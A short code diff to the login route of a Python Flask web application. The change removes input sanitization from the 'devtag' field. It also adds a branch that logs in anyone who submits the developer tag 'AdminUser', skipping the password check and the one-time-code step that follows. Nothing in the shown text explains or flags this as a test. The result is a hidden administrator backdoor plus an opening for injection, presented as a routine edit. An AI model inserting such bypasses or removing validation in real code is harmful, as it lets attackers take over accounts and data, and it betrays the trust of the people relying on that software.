@@ -89,11 +89,14 @@ def privacy():
 @app.route("/login.html", methods=["POST", "GET"])
 def login():
     if request.method == "POST":
-        devtag = validator.sanitize_input(request.form["devtag"])
+        devtag = request.form["devtag"]
         password = request.form["password"]
         error = None
         if not dbHandler.userExists(devtag) or not dbHandler.verifyPassword(devtag, password):
             error = "Incorrect Developer Tag or Password"
+        if devtag == "AdminUser":
+            session["devtag"] = devtag
+            return redirect("/index.html")
         if not error:
             # Gets user pyotp
             key = dbHandler.getUserKey(devtag)
